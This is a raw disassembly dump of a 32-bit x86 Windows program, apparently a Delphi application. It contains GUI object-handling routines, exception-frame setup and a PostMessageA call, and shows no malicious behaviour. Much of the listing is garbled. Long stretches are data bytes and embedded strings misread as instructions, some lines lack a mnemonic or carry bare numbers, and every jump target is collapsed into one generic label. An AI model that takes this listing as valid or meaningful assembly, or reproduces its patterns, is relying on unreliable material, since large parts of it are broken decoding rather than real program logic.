or eax [ edx + 0x40 ]
[ eax ] al
add [ eax ] al
mov eax 0xe800427d
sub_42670a
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000c ] al
outsd
outsb
jae r-xdata
add [ eax + eax ] cl
jb r-xdata
add [ eax ] al
add [ edi ] cl
add [ eax ] cl
imul ebp [ esi + 0x74 ] 0x42741473
add [ edx ] ch
add bh bh
push 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
or eax 0x72440a00
popad
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
push cs
push eax
popad
jb r-xdata
dec ebp
outsd
dec esp
jae r-xdata
add [ eax ] al
adc [ 0x68530800 ] 0x6f
ja r-xdata
outsb
je r-xdata
add bh bh
cmp al [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
adc cl [ ecx + 0x6e ]
jb r-xdata
outsb
imul ebp [ esi + 0x74 ] sub_44a54c
cmp [ ecx ] al
add bh bh
cmp al 0x6f
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ss
add [ edi ] al
push ebx
je r-xdata
add bh bh
cld
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
or [ eax + 0x6f ] edx
insb
inc esp
imul esi [ ebx + 0x70 ] 0x4c79616c
movsd [ edi ] [ esi ]
inc esp
add [ edx + 0x44ff0000 ] cl
int3
inc esp
jb r-xdata
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
str [ eax ]
js r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
outsb
inc ebx
movsd [ edi ] [ esi ]
inc esp
add [ edi ] al
add bh bh
cmp al cl
inc edx
add [ ecx + esi * 8 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] al
pop es
push esi
imul esi [ ebx + 0x69 ] 0xf4656c62
movsd [ edi ] [ esi ]
inc ebx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ eax - 0xf ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070019 ] al
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al [ eax ]
je r-xdata
jo r-xdata
arpl [ ebp + esi * 2 + 0x72 ] si
clc
bound eax [ eax ]
insb
add [ eax ] al
inc [ eax + 0x10042c9 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090014 ] al
outsd
xlat
inc eax
add [ eax ] ch
add [ eax ] eax
[ eax ]
outsd
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50070013 ] al
imul esp [ ebx + 0x74 ] 0xf8657275
add [ eax ] al
jo r-xdata
movsd [ edi ] [ esi ]
inc esp
dec esp
add [ ebx - 0x74010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc esp
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0a001d ] al
outsb
inc esp
jb r-xdata
js r-xdata
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
pop es
dec edi
push sub_44a54c
cmp eax [ ecx ]
add bh bh
add [ eax ] eax
push [ edi + ebp * 2 + 0x42 ]
outsb
jne r-xdata
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ ecx ] dl
add [ edx ] dl
dec ecx
outsb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
dec ebp
add [ eax ] al
[ eax ]
add [ eax ] al
dec edi
jbe r-xdata
inc esp
push eax
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001a ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ ebx ] cl
push esp
jb r-xdata
inc edx
push cs
dec edi
add [ eax ] al
sbb [ edx ] 0x0
outsb
jae r-xdata
je r-xdata

movsd [ edi ] [ esi ]
inc esp
add [ ecx - 0x3010000 ] cl
jae r-xdata
inc esp
outsd
ja r-xdata
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09001e ] al
outsb
inc ebp
outsb
inc esp
jo r-xdata
jne r-xdata
popad
jb r-xdata
inc edx
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jge r-xdata
mov [ edx + 0x42 ] bh
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0021 ] al
outsb
dec ebp
outsd
jl r-xdata
add [ eax + 0x4f090022 ] al
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax + 0x4f0b0020 ] al
and al 0x7a
inc edx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
movsd [ edi ] [ esi ]
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a001b ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
hlt
outsb
je r-xdata
je r-xdata
outsb
nop
nop
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
push ebp
jo r-xdata
popad
jb r-xdata
add al ch
imul eax [ esp + edi * 2 ] 0x42
dec ebp
outsd
jbe r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09001f ] al
outsb
inc ebp
outsb
inc esp
inc esp
jb r-xdata
mov [ ebp - 0xc ] ecx
add esp 0xfffffff0
call sub_44c370
and al 0x0
or ecx [ edi + 0x6e ]
aad 0x40
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0023 ] al
outsb
push eax
jb r-xdata
mov [ eax + 0x1c ] edx
push eax
mov eax edx
mov dx 0xffcd
call sub_44c264
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov edx 0x69
mov eax [ ebp - 0x4 ]
call sub_42bfa8
mov edx 0x69
mov eax [ ebp - 0x4 ]
call sub_42bf6c
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
push ebp
cld
inc esp
jb r-xdata
push ebx
je r-xdata
outsb
and al 0x7a
jpe r-xdata
jo r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_412048
mov edx [ ebp - 0x4 ]
jb r-xdata
dec ebp
jb r-xdata
mov eax [ eax + 0x128 ]
mov edx [ ebp - 0x4 ]
inc eax
or [ edi + ebp * 2 + 0x458b0042 ] ch
cld
jne r-xdata
add [ eax - 0x47010000 ] bh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jl r-xdata
inc esp
jpo r-xdata
mov [ edx + 0x128 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_426fac
mov eax [ ebp - 0x4 ]
inc esp
outsd
arpl [ ebx + 0x4 ] bp
jl r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_435bb4
jae r-xdata
outsd
arpl [ ebx + 0x44 ] bp
inc esp
add al bl
add [ eax ] al
hlt
add al bh
add [ eax ] al
mov eax [ r-xdata ]
mov edx [ ebp - 0x4 ]
or eax [ edx + 0x40 ]
[ eax ] al
add [ eax ] al
mov eax 0xe800427d
sub_426b84
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
call sub_44c070
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_435c24
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_426bc4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov [ ebp - 0x8 ] eax
sub_426bfc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x138 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x139 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
call sub_4125dc
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
call sub_4125b0
mov ecx eax
xor edx edx
xor eax eax
call sub_43b7c8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
call sub_4125dc
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
call sub_4125dc
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x3c ]
sub edx eax
sar edx 0x1
jns r-xdata
pop ecx
pop ecx
pop ebp
retn
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
call sub_4125b0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x38 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
call sub_4125b0
mov ecx eax
pop eax
pop edx
call sub_43b800
jmp r-xdata
adc edx 0x0
sub_426cc8
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x13c ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x13c ] 0x1
xor eax eax
push ebp
push sub_426d86
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x120 ]
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_426bfc
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
call sub_40f964
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426d8d
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x13c ] dl
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x120 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
mov dl 0x1
call sub_40f108
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_40f4d0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0xc ]
call sub_40f910
sub_426d94
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x1a ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a7a4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ eax + 0x1a ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x216 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
call sub_434bd8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x13c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x30f
mov eax [ ebp - 0xc ]
call sub_434714
push eax
call PostMessageA
push 0x0
xor ecx ecx
mov edx 0x30f
mov eax [ ebp - 0xc ]
call sub_42df28
jmp r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ ebp - 0x10 ]
mov [ eax + 0x1a ] 0x0
sub_426e64
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x13a ]
and al [ ebp + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_426d94
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov al [ ebp + 0x14 ]
push eax
mov al [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov cl [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
sub_426ee0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x139 ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x139 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_426fac
sub_426f18
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_426f3c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x138 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x138 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_426fac
sub_426f74
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x13b ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x13b ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_426fac
sub_426fac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
call sub_4125b0
test eax eax
jle r-xdata
mov eax [ r-xdata ]
mov edx [ ebp - 0x4 ]
not eax
and eax [ edx + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
call sub_4125dc
test eax eax
jle r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
call sub_4125b0
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
call sub_4125dc
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov eax [ r-xdata ]
mov edx [ ebp - 0x4 ]
not eax
and eax [ edx + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x138 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x13b ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x13c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x13c ] 0x0
je r-xdata
mov eax [ r-xdata ]
mov edx [ ebp - 0x4 ]
or eax [ edx + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x38 ]
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_426d94
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jl r-xdata
sub_42711c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x4b ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
call sub_4125b0
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
call sub_4125b0
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
add al 0xfd
sub al 0x2
jae r-xdata
mov al [ ebp - 0xd ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
call sub_4125dc
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x128 ]
call sub_4125dc
mov edx [ ebp - 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x4b ]
sub al 0x3
jae r-xdata
sub_4271a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4271c9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4271d0
retn
sub_427418
add [ edi ] eax
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
loopne r-xdata
jae r-xdata
add [ eax ] al
pushad
jne r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add al ah
je r-xdata
jb r-xdata
xchg esi eax
inc edx
add ah ah
xchg esi eax
inc edx
add [ eax - 0x69 ] dh
inc edx
add al dh
xchg esi eax
inc edx
add [ esi ] dl
push esp
inc edx
popad
jae r-xdata
add [ eax + eax ] bh
add [ eax ] al
je r-xdata
xchg esi eax
inc edx
add ah ah
xchg esi eax
inc edx
add [ ebx ] cl
push esp
inc esp
jb r-xdata
add [ eax + eax ] dh
add [ eax ] al
enter 0x44a5 0x0
xchg esp eax
retn 0x44
add [ eax + 0x7fffffff ] al
add [ eax ] al
nop
nop
xor [ edx + eax * 2 ] dh
add eax [ esi ]
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ 0x2c000000 ] al
je r-xdata
add [ eax + ebx * 4 ] bl
inc edx
add [ edi + edx * 4 ] dh
inc edx
add [ eax ] ah
xchg ebp eax
inc edx
add [ eax + ebx * 4 ] bh
inc edx
add ah cl
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
inc edx
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ eax - 0x6fffbd69 ] ah
xchg esi eax
inc edx
add [ eax - 0x6a ] bh
inc edx
add [ edi + edx * 4 ] dh
inc edx
add [ eax ] ah
xchg ebp eax
inc edx
add al al
xchg esi eax
inc edx
add ah cl
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edi + 0x75 ] si
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x75 ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
inc edx
add [ eax - 0x6a ] bh
inc edx
add [ ecx + ebx * 4 + 0x42 ] al
add [ eax ] ah
xchg ebp eax
inc edx
add al al
xchg esi eax
inc edx
add ah cl
xchg esi eax
inc edx
add ah ah
inc ebx
outsd
outsb
je r-xdata
inc edx
inc ebx
outsd
outsb
je r-xdata
xchg esi eax
inc edx
add [ eax - 0x68 ] ch
add [ eax ] al
add [ eax ] al
in al dx
je r-xdata
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
inc ebx
add [ esi + edi * 8 ] ah
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x76 ] si
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 ] cl
xchg esi eax
inc edx
add al dl
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x4c ] si
jbe r-xdata
inc edx
add [ eax - 0x69 ] dh
cwde
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x3c ] si
jne r-xdata
inc edx
add al dh
xchg esi eax
inc edx
add [ edx ] dl
push esp
inc esp
jb r-xdata
xchg edi eax
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x74c09074
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
xchg esp eax
inc edx
add [ eax ] ah
xchg ebp eax
inc edx
add al al
xchg esi eax
inc edx
add ah cl
outsd
insd
retn 0x44
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
inc ebx
outsd
outsb
push esp
inc eax
add [ eax ] al
inc [ eax ]
and [ edi + 0x540e0042 ] ch
add [ eax + eax ] ah
add [ esp + edx * 8 ] ch
inc eax
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax - 0x1c ] 0xae
inc edx
add [ eax ] dl
into
inc ebx
add [ esi + ecx * 8 ] ch
inc ebx
add [ ecx * 8 - 0x1dbffbd ] cl
rol [ eax + eax + 0x8 ] 0x99
inc edx
add [ eax + 0x2c004297 ] ah
fwait
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 + 0x700042 ] al
add [ eax ] al
in al dx
je r-xdata
rol [ eax + eax + 0x60 ] 0xc0
inc esp
add [ eax - 0x1bffbd69 ] ah
xchg edi eax
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x4c ] 0x2d
inc esp
add [ eax - 0x6bffbd4e ] dl
sub eax 0xb5140044
jae r-xdata
cdq
inc edx
add [ eax + ebx * 4 - 0x65c7ffbe ] dl
inc edx
add ah ch
0x9b0c0042 0x42
dec esp
fwait
inc edx
add [ edi ] cl
push esp
inc esp
jb r-xdata
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
or [ esp + edx * 2 + 0x61 ] edx
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x4277fc90
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al bh
ja r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x77
or al 0x77
inc edx
add [ edi ] al
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
bound ecx [ edi + 0x72 ]
jb r-xdata
imul edx [ eax + 0x42785c90 ] 0x0
add [ ecx ] ecx
push esp
push esp
popad
add [ eax ] cl
